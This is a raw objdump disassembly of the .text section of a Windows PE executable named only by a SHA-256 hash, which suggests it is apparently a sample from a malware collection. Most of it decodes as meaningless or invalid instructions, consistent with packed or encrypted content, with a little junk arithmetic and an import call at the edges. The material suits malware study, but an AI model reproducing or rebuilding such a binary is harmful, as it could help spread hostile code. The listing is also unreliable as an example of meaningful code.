
efc0e1b000d4b48d87043728e2a508b5b1ee1a1ad6b191316e03b59a9a509d12.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428451,0x4284f1
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428475,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42835d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428469,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x428431
  40104f:	xor    DWORD PTR ds:0x428575,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	adc    BYTE PTR [esi-0x41416f21],al
  40106f:	mov    esi,0xbec4bdbe
  401074:	mov    esi,0xc43fd8d0
  401079:	push   ss
  40107a:	ds out 0x1f,al
  40107d:	(bad)  [eax+0x5be9ef0]
  401083:	add    eax,0xddc3c61f
  401088:	lds    esp,FWORD PTR [ebp+0x6e]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    ?,WORD PTR [esp+eax*4-0x44]
  4010ad:	int    0xf4
  4010af:	cmp    esp,eax
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xfe52947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcl    bh,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	jmp    0x401083
  4010c8:	cmp    BYTE PTR [esi],dh
  4010ca:	dec    ecx
  4010cb:	in     al,dx
  4010cc:	inc    edx
  4010cd:	lds    esi,FWORD PTR [edx+0x14b8a40a]
  4010d3:	dec    ecx
  4010d4:	xor    al,0x43
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [ebx-0x4eee7882],esi
  4010de:	outs   dx,DWORD PTR cs:[esi]
  4010e0:	cmp    al,0x9b
  4010e2:	leave  
  4010e3:	xchg   edx,eax
  4010e4:	rcr    BYTE PTR [edi],1
  4010e6:	sbb    al,0xe5
  4010e8:	sar    BYTE PTR [esi-0x13a3499a],0xf5
  4010ef:	sti    
  4010f0:	loop   0x401141
  4010f2:	jge    0x4010bf
  4010f4:	loope  0x401136
  4010f6:	retf   0x667a
  4010f9:	mov    ds:0xee122471,al
  4010fe:	add    al,BYTE PTR [edi]
  401100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401101:	rcr    ecx,cl
  401103:	jl     0x401168
  401105:	mov    edi,0x290da2fa
  40110a:	(bad)  
  40110b:	adc    eax,0x1ea49599
  401110:	repz xor DWORD PTR [ecx+0x1a280add],esp
  401117:	je     0x40111a
  401119:	ror    BYTE PTR [edi-0x39],cl
  40111c:	jnp    0x401149
  40111e:	pop    esp
  40111f:	and    DWORD PTR [edi-0x31d5af61],ebp
  401125:	or     BYTE PTR [edi+0xe],bl
  401128:	leave  
  401129:	mov    ch,0xa1
  40112b:	shl    BYTE PTR [ebp-0x7a],1
  40112e:	jmp    0x251ca0ef
  401133:	(bad)  
  401134:	xchg   edi,eax
  401135:	jl     0x401103
  401137:	inc    ebx
  401138:	mov    bh,0x35
  40113a:	mov    edi,0xdfd71745
  40113f:	adc    DWORD PTR [ebx-0x5589cd7c],ebp
  401145:	pop    ebx
  401146:	lods   al,BYTE PTR ds:[esi]
  401147:	xchg   ebp,eax
  401148:	ss jge 0x401170
  40114b:	aas    
  40114c:	fisttp QWORD PTR ds:0x707a79
  401152:	int3   
  401153:	wbinvd 
  401155:	rcl    DWORD PTR [ecx-0x2],1
  401158:	mov    cl,0x94
  40115a:	sub    ecx,DWORD PTR [eax-0x7d324b39]
  401160:	in     eax,dx
  401161:	inc    ebp
  401162:	and    DWORD PTR [esi-0x4f],ecx
  401165:	out    dx,al
  401166:	(bad)  
  401168:	pop    ebx
  401169:	div    ecx
  40116b:	mov    ds:0x426351fd,al
  401170:	sahf   
  401171:	stc    
  401172:	leave  
  401173:	jmp    0x4c7da10
  401178:	cdq    
  401179:	or     bl,BYTE PTR [edi]
  40117b:	inc    esp
  40117c:	leave  
  40117d:	inc    edi
  40117e:	mov    ecx,0x906d41f4
  401183:	mov    DWORD PTR [esi-0x14450b31],edx
  401189:	int    0x99
  40118b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40118c:	test   al,0x77
  40118e:	mov    eax,ds:0x56710c5c
  401193:	inc    esp
  401194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401195:	pop    esp
  401196:	add    ebx,DWORD PTR [ebx]
  401198:	popa   
  401199:	ds jae 0x401159
  40119c:	push   esi
  40119d:	sbb    edi,DWORD PTR [ebx-0x105c905f]
  4011a3:	dec    esp
  4011a4:	mov    dh,0x97
  4011a6:	in     eax,dx
  4011a7:	adc    eax,0xf692046e
  4011ac:	pop    ecx
  4011ad:	gs and dl,cl
  4011b0:	xor    eax,0x4fec283d
  4011b5:	aam    0xfa
  4011b7:	lds    ebx,FWORD PTR [eax+ecx*2-0x4d]
  4011bb:	inc    esp
  4011bc:	cli    
  4011bd:	jge    0x4011c7
  4011bf:	out    dx,eax
  4011c0:	jae    0x401145
  4011c2:	or     bl,ah
  4011c4:	or     eax,0x827807ee
  4011c9:	fcomp  st(2)
  4011cb:	and    ebp,ecx
  4011cd:	push   ss
  4011ce:	or     ah,BYTE PTR [edi]
  4011d0:	js     0x40116a
  4011d2:	hlt    
  4011d3:	test   DWORD PTR [eax-0x3efe4d66],0x3a64bcc8
  4011dd:	push   eax
  4011de:	xchg   esi,eax
  4011df:	jl     0x40116b
  4011e1:	mov    edx,0xf592389a
  4011e6:	xor    BYTE PTR [edi+0x29],al
  4011e9:	fdivr  QWORD PTR [eax]
  4011eb:	push   ebx
  4011ec:	mov    cl,0x99
  4011ee:	xchg   ebp,eax
  4011ef:	repz dec esi
  4011f1:	inc    esi
  4011f2:	mov    bh,0x58
  4011f4:	xchg   esi,eax
  4011f5:	or     dl,BYTE PTR [ebp+0x7c3ec300]
  4011fb:	pusha  
  4011fc:	scas   al,BYTE PTR es:[edi]
  4011fd:	mov    BYTE PTR [eax],al
  4011ff:	shr    DWORD PTR [esi-0x5],cl
  401202:	adc    eax,DWORD PTR [ebx+0x6b]
  401205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401206:	and    al,0xba
  401208:	adc    eax,0x1160ed9c
  40120d:	push   0x1d
  40120f:	fdivr  DWORD PTR [ebx+0x32]
  401212:	xchg   ebp,eax
  401213:	jne    0x401255
  401215:	sbb    DWORD PTR [ecx-0x4a],ebp
  401218:	sbb    esi,esp
  40121a:	jge    0x401224
  40121c:	mov    al,ds:0x29f160b5
  401221:	stos   BYTE PTR es:[edi],al
  401222:	push   0x2841a6bc
  401227:	xor    dh,BYTE PTR ds:0x3b816ba7
  40122d:	rcl    BYTE PTR [esi],0xb3
  401230:	daa    
  401231:	dec    esp
  401232:	pusha  
  401233:	mov    al,0x6d
  401235:	mov    esi,0xd78451c5
  40123a:	push   0x5a
  40123c:	inc    BYTE PTR [eax-0x5e]
  40123f:	ret    0xf57e
  401242:	mov    bh,BYTE PTR [eax+ecx*4-0x1d]
  401246:	jne    0x401230
  401248:	sbb    DWORD PTR [esi-0x1bf9a101],edx
  40124e:	dec    edx
  40124f:	ret    
  401250:	(bad)  
  401251:	sahf   
  401252:	mov    eax,ds:0x3cd51640
  401257:	dec    esi
  401258:	pop    ebp
  401259:	fld    TBYTE PTR [esi]
  40125b:	enter  0xbbce,0x2e
  40125f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401260:	popf   
  401261:	push   esp
  401262:	mov    esi,0xbab61689
  401267:	add    DWORD PTR [esi],esp
  401269:	hlt    
  40126a:	stos   BYTE PTR es:[edi],al
  40126b:	iret   
  40126c:	fidivr WORD PTR [eax]
  40126e:	push   edx
  40126f:	repnz mov esp,DWORD PTR [ebx-0x66]
  401273:	cmp    ebp,DWORD PTR [edi+0x29b80a11]
  401279:	cmp    DWORD PTR [edi],ebp
  40127b:	pop    ds
  40127c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127d:	jnp    0x4012f9
  40127f:	xcrypt-ecb (bad)
  401280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401281:	leave  
  401282:	mov    al,0x14
  401284:	into   
  401285:	pop    esp
  401286:	and    DWORD PTR [esi+0x59ccfe08],edx
  40128c:	or     BYTE PTR [eax],bl
  40128e:	pop    eax
  40128f:	dec    esi
  401290:	leave  
  401291:	inc    esi
  401292:	leave  
  401293:	ret    0xb08
  401296:	loopne 0x401265
  401298:	enter  0xf321,0x17
  40129c:	pop    ecx
  40129d:	out    dx,al
  40129e:	add    ebp,DWORD PTR [eax+0x93f43d4]
  4012a4:	push   esi
  4012a5:	mul    BYTE PTR [ecx-0x46]
  4012a8:	sbb    DWORD PTR [edx+0x77c4005e],edx
  4012ae:	and    eax,0x11a0327a
  4012b3:	cmp    eax,0xf3688775
  4012b8:	jmp    0x1999:0xd0ee2a0d
  4012bf:	jmp    0x3d9cf88f
  4012c4:	lea    ebx,[edx]
  4012c6:	ror    BYTE PTR ss:[edx-0x6c7d0f7d],cl
  4012cd:	pusha  
  4012ce:	jbe    0x4012a2
  4012d0:	mov    ebx,0x49f2cce1
  4012d5:	and    DWORD PTR ds:0x17b65003,ebx
  4012db:	retf   0x7efc
  4012de:	loopne 0x40134a
  4012e0:	mov    ds:0x5fa8f607,eax
  4012e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012e6:	test   dl,ah
  4012e8:	sub    al,ch
  4012ea:	adc    al,0x2b
  4012ec:	sub    al,0xfb
  4012ee:	mov    BYTE PTR [ecx+0x79],bl
  4012f1:	(bad)  
  4012f2:	repnz mov ebp,0x6ed5b077
  4012f8:	(bad)  
  4012f9:	or     eax,0x156764fb
  4012fe:	and    edi,DWORD PTR [edi+eiz*4+0x41bae6db]
  401305:	pop    ss
  401306:	test   eax,0xf0a4f20c
  40130b:	adc    eax,esp
  40130d:	push   esi
  40130e:	inc    esp
  40130f:	cld    
  401310:	or     BYTE PTR [ebx-0x591ef1ba],0xe0
  401317:	sub    edi,DWORD PTR [ebp+0x64aa9ac3]
  40131d:	mov    edi,0xcc2071a1
  401322:	and    BYTE PTR [esi+eiz*8],ah
  401325:	cmc    
  401326:	mov    eax,0x6084d216
  40132b:	iret   
  40132c:	cmp    BYTE PTR [edx-0x6],dl
  40132f:	pushf  
  401330:	inc    esp
  401331:	push   0x12
  401333:	pop    eax
  401334:	sbb    esi,esp
  401336:	add    al,0x3b
  401338:	or     BYTE PTR [ecx-0x5e],dl
  40133b:	jns    0x401309
  40133d:	sub    ch,bh
  40133f:	jl     0x40137a
  401341:	add    eax,0xe6db9b48
  401346:	jp     0x401326
  401348:	addr16 jmp 0x40134c
  40134b:	pop    edx
  40134c:	sbb    BYTE PTR ds:0xe7f2ccc,bh
  401352:	scas   al,BYTE PTR es:[edi]
  401353:	in     al,dx
  401354:	cmp    al,0xa5
  401356:	xor    BYTE PTR [edi-0x29fe3436],bl
  40135c:	ror    DWORD PTR [ebx],1
  40135e:	add    edx,DWORD PTR [ebx+eax*2]
  401361:	fist   WORD PTR [edx]
  401363:	mov    bl,0xf0
  401366:	mov    edx,0xef8f75da
  40136b:	pop    ebp
  40136c:	push   eax
  40136d:	sbb    ecx,DWORD PTR [edx-0x6ba3eec2]
  401373:	lods   al,BYTE PTR ds:[esi]
  401374:	fcom   QWORD PTR [edx+0x1aff6eec]
  40137a:	repz je 0x4013a7
  40137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40137e:	dec    esp
  40137f:	mov    dh,0xf9
  401381:	int3   
  401382:	jbe    0x40136b
  401384:	xchg   edx,ecx
  401386:	es nop
  401388:	pushf  
  401389:	xchg   BYTE PTR [esi-0x22],ah
  40138c:	xchg   ebp,eax
  40138d:	fist   DWORD PTR [ebx]
  40138f:	ficom  WORD PTR [esi+ecx*2]
  401392:	aas    
  401393:	or     BYTE PTR ds:0x83e05cd7,al
  401399:	(bad)  
  40139a:	imul   eax,DWORD PTR [edi-0x617f113e],0x26cb2f68
  4013a4:	add    esi,ebx
  4013a6:	in     al,dx
  4013a7:	cdq    
  4013a8:	pop    ebx
  4013a9:	lea    edx,[edx]
  4013ab:	adc    al,0x2
  4013ad:	sbb    BYTE PTR [esi],bh
  4013af:	and    esp,edi
  4013b1:	add    DWORD PTR [esi-0x4f],ebp
  4013b4:	ja     0x401387
  4013b6:	ds xor ah,cl
  4013b9:	mov    al,ds:0xfdd321de
  4013be:	loopne 0x401385
  4013c0:	arpl   WORD PTR [ecx-0x476b6e35],cx
  4013c6:	mov    edi,0x4df0d51
  4013cb:	repz xchg edx,eax
  4013cd:	adc    DWORD PTR [esi-0x2a0dafe6],esp
  4013d3:	pop    DWORD PTR ds:0xec47e089
  4013d9:	dec    edx
  4013da:	sub    al,BYTE PTR fs:[edx-0x15a735ba]
  4013e1:	dec    eax
  4013e2:	mov    edx,0x2b14c9f0
  4013e7:	push   edi
  4013e8:	mov    cl,0x5a
  4013ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013eb:	int    0x3c
  4013ed:	sbb    BYTE PTR [ecx+0x9],0xd2
  4013f1:	fiadd  DWORD PTR [edi-0x20]
  4013f4:	mov    esi,DWORD PTR [ebx]
  4013f6:	(bad)  
  4013f7:	(bad)  
  4013f8:	arpl   WORD PTR [ebx+0x3d03ac4d],cx
  4013fe:	rol    DWORD PTR [edx+eax*2-0x57aa7500],1
  401405:	sbb    DWORD PTR ds:0x4284e9,ecx
  40140b:	mov    edi,DWORD PTR [ebp-0x54]
  40140e:	sub    DWORD PTR ds:0x428575,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428461
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x619b7da9],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x4feaf0be]
  401441:	mov    DWORD PTR [ebx+0x46b907cc],esi
  401447:	dec    eax
  401448:	out    0x79,eax
  40144a:	cmp    al,0x3e
  40144d:	mov    bl,BYTE PTR [esi+0x460a7596]
  401453:	sub    BYTE PTR [edi+0x5e],bh
  401456:	mov    bh,bh
  401458:	bound  esp,QWORD PTR [esi]
  40145a:	test   al,0x91
  40145c:	scas   al,BYTE PTR es:[edi]
  40145d:	shl    DWORD PTR gs:[esi+0x6e],1
  401461:	lock mov esi,0x7c5f8dab
  401467:	inc    esp
  401468:	pop    ds
  401469:	jecxz  0x4013ed
  40146b:	xor    edi,DWORD PTR [edx+0xf]
  40146e:	repnz and BYTE PTR [ecx-0x29996f5e],dl
  401475:	mov    ch,0x4d
  401477:	push   eax
  401478:	pop    ecx
  401479:	push   ecx
  40147a:	mov    eax,0xb729a569
  40147f:	nop
  401480:	pop    es
  401481:	mov    eax,0xd760af08
  401486:	retf   0xfcca
  401489:	jg     0x4014dd
  40148b:	mov    al,0xbe
  40148d:	ins    BYTE PTR es:[edi],dx
  40148e:	shl    BYTE PTR [esi-0x104db2f6],0xcb
  401495:	sub    DWORD PTR [ecx],edi
  401497:	imul   edi,DWORD PTR [edi],0xaf62ffd6
  40149d:	js     0x40143a
  40149f:	fst    QWORD PTR [ebp+eax*1-0x46f5f6b6]
  4014a6:	test   bl,bh
  4014a8:	shr    BYTE PTR [esp+edi*1],cl
  4014ab:	sbb    edx,DWORD PTR [eax+0x5a57f1c9]
  4014b1:	cld    
  4014b2:	jno    0x4014ee
  4014b4:	jl     0x4014fb
  4014b6:	inc    ebx
  4014b7:	and    al,0x6
  4014b9:	add    BYTE PTR [eax+0x248faae4],ah
  4014bf:	scas   eax,DWORD PTR es:[edi]
  4014c0:	jmp    0xe629003
  4014c5:	(bad)  
  4014c6:	mov    ah,0x4d
  4014c8:	in     eax,dx
  4014c9:	and    esp,DWORD PTR [esi]
  4014cb:	ins    BYTE PTR es:[edi],dx
  4014cc:	sahf   
  4014cd:	jg     0x4014e4
  4014cf:	daa    
  4014d0:	push   ss
  4014d1:	mov    ebp,0x628fc444
  4014d6:	loope  0x4014f1
  4014d8:	pop    edi
  4014d9:	popa   
  4014da:	xlat   BYTE PTR ds:[ebx]
  4014db:	fwait
  4014dc:	(bad)
  4014df:	cmp    eax,0x39ee35b2
  4014e4:	fild   DWORD PTR [ecx-0x5496e35a]
  4014ea:	enter  0xabea,0x4c
  4014ee:	sub    ebp,DWORD PTR [esi+0x48]
  4014f1:	(bad)  
  4014f2:	pop    eax
  4014f3:	jmp    0xae97b97f
  4014f8:	repnz push ebx
  4014fa:	std    
  4014fb:	inc    esp
  4014fc:	mov    esi,0x2b4de0be
  401501:	outs   dx,DWORD PTR ds:[esi]
  401502:	mov    fs,WORD PTR ds:0x83607c0f
  401508:	ins    DWORD PTR es:[edi],dx
  401509:	xchg   esp,eax
  40150a:	es out dx,al
  40150c:	icebp  
  40150d:	call   0x27bd:0xcdbde6d0
  401514:	push   0xffffffa9
  401516:	inc    ecx
  401517:	ss (bad) 
  401519:	outs   dx,BYTE PTR ds:[esi]
  40151a:	jg     0x4014c4
  40151c:	es (bad) 
  40151e:	enter  0xd9d8,0x49
  401522:	mov    esi,0xe9f4ee93
  401527:	dec    eax
  401528:	sahf   
  401529:	jle    0x401581
  40152b:	aam    0x17
  40152d:	sub    eax,0xa065b1c9
  401532:	pop    eax
  401533:	int    0x45
  401535:	fdiv   st(5),st
  401537:	sbb    DWORD PTR [ecx+edx*8+0x4d661fff],edi
  40153e:	cmp    ebx,DWORD PTR [edi-0x4cf6a2bc]
  401544:	xchg   DWORD PTR [eax+0x19],esp
  401547:	and    ecx,DWORD PTR [edx+0xf]
  40154a:	pushf  
  40154b:	xchg   esp,eax
  40154c:	sbb    eax,0xe5ea2abf
  401551:	dec    ebp
  401552:	aaa    
  401553:	mov    al,ds:0xe494afc9
  401558:	cmp    eax,0xc42e6865
  40155d:	and    BYTE PTR [ebx+eax*1+0x1e0f6227],0xf9
  401565:	add    eax,0x2e41ec95
  40156a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40156b:	add    al,0x32
  40156d:	push   0xffffffa8
  40156f:	inc    ecx
  401570:	xor    eax,0xf2040b96
  401575:	xchg   esp,eax
  401576:	inc    edi
  401577:	in     al,dx
  401578:	(bad)  
  401579:	dec    esi
  40157a:	ret    0x4308
  40157d:	push   cs
  40157e:	aaa    
  40157f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401580:	mov    al,ds:0x3a2918d1
  401585:	icebp  
  401586:	sub    dh,ah
  401588:	cmp    al,0xf2
  40158a:	mov    ds:0x8d2afda1,eax
  40158f:	jl     0x401551
  401591:	xor    bl,dl
  401593:	call   0x8a6f590b
  401598:	xor    edi,DWORD PTR [esi+edx*8+0x16b76b2f]
  40159f:	dec    esp
  4015a0:	or     eax,0x570a12d5
  4015a5:	loopne 0x4015d7
  4015a7:	in     al,dx
  4015a8:	cwde   
  4015a9:	push   ecx
  4015aa:	and    BYTE PTR [esp+eiz*8+0x6888d85f],cl
  4015b1:	sbb    BYTE PTR [eax+0x5fb79cd8],ah
  4015b7:	jg     0x401546
  4015b9:	mov    dh,0x55
  4015bb:	je     0x401580
  4015bd:	push   0xb0c80f97
  4015c2:	sbb    DWORD PTR [edi+0x53b02b80],ecx
  4015c8:	(bad)  
  4015c9:	pop    esp
  4015ca:	imul   edx,DWORD PTR [esp+ecx*4],0xbdcc0b47
  4015d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d2:	or     eax,0x6caa6f47
  4015d7:	jns    0x401616
  4015d9:	jle    0x4015dc
  4015db:	gs es rcr edi,cl
  4015df:	ret    0x46d3
  4015e2:	cmp    DWORD PTR [ebx+0x24d4c80b],edi
  4015e8:	push   ss
  4015e9:	icebp  
  4015ea:	icebp  
  4015eb:	and    eax,0xcda61615
  4015f0:	sar    DWORD PTR [edx+eiz*1+0x66],1
  4015f4:	popa   
  4015f5:	jl     0x4015af
  4015f7:	inc    edi
  4015f8:	icebp  
  4015f9:	dec    eax
  4015fa:	mov    ah,0x17
  4015fc:	(bad)  
  4015fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015ff:	ficom  DWORD PTR [ebp+0x1c0b87a2]
  401605:	cdq    
  401606:	cs inc eax
  401608:	retf   0x7ebc
  40160b:	imul   edi,DWORD PTR [eax],0x20200f06
  401611:	gs add eax,0x4622750
  401617:	fcom   DWORD PTR [ecx+0xb]
  40161a:	mov    dh,0x4d
  40161c:	push   edi
  40161d:	adc    ch,dl
  40161f:	call   0xf66f:0x782b670
  401626:	mov    ecx,0x6e884442
  40162b:	push   ebx
  40162c:	ret    0x4bdc
  40162f:	push   0x15
  401631:	gs jecxz 0x401600
  401634:	sbb    cl,ah
  401636:	pop    ds
  401637:	dec    eax
  401638:	pop    ds
  401639:	sub    ch,cl
  40163b:	pop    esp
  40163c:	retf   
  40163d:	xor    eax,0x81d70ab5
  401642:	mov    bh,0xba
  401644:	xchg   edx,eax
  401645:	xchg   ebx,eax
  401646:	pop    ss
  401647:	push   ebp
  401648:	repnz xor al,0xdd
  40164b:	mov    al,ds:0xea0e151b
  401650:	fisttp QWORD PTR [ecx+0x23]
  401653:	xor    DWORD PTR [eax+ecx*2],ecx
  401656:	push   ss
  401657:	in     eax,dx
  401658:	ret    
  401659:	pushf  
  40165a:	test   edi,edi
  40165c:	sbb    bh,cl
  40165e:	mov    al,0xa7
  401660:	sub    eax,0xd0fa4d01
  401665:	sar    DWORD PTR [ebx-0x28],cl
  401668:	mov    eax,0x5a8f7a28
  40166d:	iret   
  40166e:	test   al,0x16
  401670:	mov    ecx,0xdb38f27c
  401675:	sub    DWORD PTR [bp+si-0xc],edx
  401679:	mov    DWORD PTR [ebp-0x44],ebp
  40167c:	stos   DWORD PTR es:[edi],eax
  40167d:	lea    ebp,[edi]
  40167f:	dec    eax
  401680:	inc    ecx
  401681:	jle    0x4016a2
  401683:	dec    eax
  401684:	rcr    ebx,1
  401686:	pop    edi
  401687:	sub    esi,DWORD PTR [esi+0x1058c2c1]
  40168d:	add    BYTE PTR [eax-0x90026f6],0x1e
  401694:	adc    edi,DWORD PTR [eax-0x20]
  401697:	add    BYTE PTR [ebx+0xb18ef6a],bh
  40169d:	lock dec esp
  40169f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a0:	jns    0x401635
  4016a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a3:	ja     0x40163b
  4016a5:	stc    
  4016a6:	and    edx,ebx
  4016a8:	aas    
  4016a9:	(bad)  
  4016aa:	sbb    al,0x30
  4016ac:	push   0x3d130153
  4016b1:	into   
  4016b2:	leave  
  4016b3:	scas   al,BYTE PTR es:[edi]
  4016b4:	sub    eax,0xe6707178
  4016b9:	repz js 0x4016e3
  4016bc:	imul   esp,esp,0x3fae3d02
  4016c2:	jge    0x4016c1
  4016c4:	mov    dh,0x80
  4016c6:	adc    al,BYTE PTR [esi+0x17]
  4016c9:	das    
  4016ca:	bnd jno 0x40172a
  4016cd:	dec    edx
  4016ce:	add    DWORD PTR [edi+0xf2f9e11],ebp
  4016d4:	into   
  4016d5:	push   ebx
  4016d6:	int    0x1e
  4016d8:	xor    bl,ch
  4016da:	aam    0x13
  4016dc:	mov    DWORD PTR [edi],esp
  4016de:	js     0x4016e6
  4016e0:	jno    0x4016dd
  4016e2:	inc    edi
  4016e3:	jmp    0xc3a9:0xf34d00f3
  4016ea:	lock pop es
  4016ec:	sub    al,0x45
  4016ee:	mov    ds,edi
  4016f0:	mov    ds,ecx
  4016f2:	ja     0x40167c
  4016f4:	test   BYTE PTR [eax-0x39],ch
  4016f7:	jge    0x4016f8
  4016f9:	xlat   BYTE PTR ds:[ebx]
  4016fa:	cdq    
  4016fb:	fs ja  0x401721
  4016fe:	xchg   ecx,eax
  4016ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401700:	loope  0x40168b
  401702:	dec    eax
  401703:	xor    BYTE PTR [esi-0x347951a5],al
  401709:	pop    ds
  40170a:	mov    dh,0x9a
  40170c:	fnstenv [ebx+0x29]
  40170f:	mov    ch,0xde
  401711:	jbe    0x401769
  401713:	ja     0x401731
  401715:	xor    eax,0x5e8ae1b3
  40171a:	imul   ebp,DWORD PTR [ecx],0x910b9d1d
  401720:	pop    ebp
  401721:	mov    dl,dh
  401723:	mov    bh,BYTE PTR [ebp-0x4f]
  401726:	dec    ecx
  401727:	push   ebp
  401728:	dec    ebp
  401729:	stos   BYTE PTR es:[edi],al
  40172a:	jg     0x40176b
  40172c:	cmp    ebx,DWORD PTR [ebx+0x38]
  40172f:	int3   
  401730:	mov    gs,WORD PTR [eax]
  401732:	jle    0x4016f4
  401734:	aam    0xe9
  401736:	mov    es,WORD PTR [edx]
  401738:	mov    cl,0xc
  40173a:	repnz sub edx,DWORD PTR [ecx-0x38e08910]
  401741:	jo     0x40177a
  401743:	mov    DWORD PTR [ecx-0xb27959d],ebp
  401749:	cld    
  40174a:	(bad)  
  40174b:	test   al,0x97
  40174d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174e:	sti    
  40174f:	jl     0x4016fd
  401751:	mov    dl,0x77
  401753:	sar    BYTE PTR [esi-0x68],0x5c
  401757:	mov    ch,0x9d
  401759:	sbb    BYTE PTR [ebx],al
  40175b:	(bad)  
  40175c:	xchg   edi,eax
  40175d:	retf   0x195c
  401760:	mov    edx,edi
  401762:	cmp    bh,al
  401764:	or     al,0xc2
  401766:	jp     0x94309769
  40176c:	out    0x17,al
  40176e:	mov    eax,ds:0xdc6a8bce
  401773:	popa   
  401774:	nop
  401775:	cdq    
  401776:	cdq    
  401777:	cmc    
  401778:	loopne 0x401762
  40177a:	pop    eax
  40177b:	cmc    
  40177c:	mov    bl,0xe0
  40177e:	loopne 0x40173a
  401780:	das    
  401781:	or     al,0x67
  401783:	bound  ecx,QWORD PTR [edx]
  401785:	enter  0x4934,0x10
  401789:	and    ah,BYTE PTR [edi+0x3c]
  40178c:	mov    edx,0xdd0fda97
  401791:	je     0x401717
  401793:	stos   BYTE PTR es:[edi],al
  401794:	repnz icebp 
  401796:	es pop eax
  401798:	xchg   edx,eax
  401799:	daa    
  40179a:	int    0x58
  40179c:	aad    0xea
  40179e:	adc    eax,0xd2c4a3f3
  4017a3:	jl     0x4017d7
  4017a5:	xor    esp,DWORD PTR [edi-0x61]
  4017a8:	jbe    0x40179d
  4017aa:	sbb    ah,bl
  4017ac:	ja     0x40177d
  4017ae:	fidiv  WORD PTR [ebx+0x7c]
  4017b1:	call   0x1f0c:0x93cfec44
  4017b8:	inc    eax
  4017b9:	retf   
  4017ba:	push   es
  4017bb:	out    0x19,eax
  4017bd:	fstp   TBYTE PTR [ecx]
  4017bf:	add    DWORD PTR [ebx-0x57ba769d],0x1b
  4017c6:	iret   
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428451,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x428449,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428565
  4017f4:	movzx  ecx,WORD PTR ds:0x428359
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x428449,0x0
  401811:	ja     0x401846
  401817:	push   0x428295
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428355
  40182a:	xor    DWORD PTR ds:0x4284c5,edx
  401830:	mov    edi,DWORD PTR ds:0x428435
  401836:	or     DWORD PTR ds:0x4284cd,edi
  40183c:	or     DWORD PTR ds:0x428345,0x7336
  401846:	sbb    DWORD PTR ds:0x428449,0x42f3
  401850:	mov    DWORD PTR ds:0x428579,0x382b
  40185a:	inc    DWORD PTR ds:0x428581
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422580
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428465,0xc55
  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
